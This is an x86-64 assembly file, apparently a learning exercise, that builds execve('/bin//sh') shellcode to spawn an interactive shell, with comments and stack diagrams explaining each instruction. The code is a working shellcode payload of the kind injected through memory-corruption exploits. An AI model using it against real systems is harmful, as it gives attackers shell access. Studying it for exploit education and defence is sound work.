global _start

section .text

_start:
	; Simple assembly code to launch interactive shell by invoke execve(59) syscall

	; Set RAX to all zero

	xor rax, rax

	; Push RAX into stack
	push rax

	; Stack:
	;        +------------------+
	; rsp => |0x0000000000000000|
	;        +------------------+

	; load hex '/bin//sh' into register RBX (in reverse order so it's actually 'hs//nib/' in memory
	; why double forward slash? this makes it 8 byte to fit into stack
	; use python to generate this hex string:
	; x = '/bin/sh'
	; x[::-1].encode('hex')

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; Stack:
	;        +------------------+
	; rsp => |0x68732f2f6e69622f|
	;        +------------------+
	;        |0x0000000000000000|
	;        +------------------+

	; let RDI hold the address to the hex representation of '/bin//sh'

	mov rdi, rsp

	; push RAX (null byte) into stack to null terminate following argument

	push rax

	; push RDI (address of the '/bin/sh') into stack, so that RSP now point to the address of it

	push rdi

	; Stack: (RSP now point to the address of the address of the '/bin/sh')
	;        +------------------+
	; rsp => |0x00007fffffffe0e0|
	;        +------------------+
	;        |0x0000000000000000|
	;        +------------------+
	;        |0x68732f2f6e69622f|
	;        +------------------+
	;        |0x0000000000000000|
	;        +------------------+
	; in my case, it's 0x00007fffffffe0e0, because of ASLR, the address can be different

	; let RSI hold the address of the address to '/bin/sh', good to go

	mov rsi, rsp

	; xor RDX, so it's holds nothing, we don't need to use it

	xor rdx, rdx

	; 59 stand for execve syscall number

	add rax, 59
	syscall

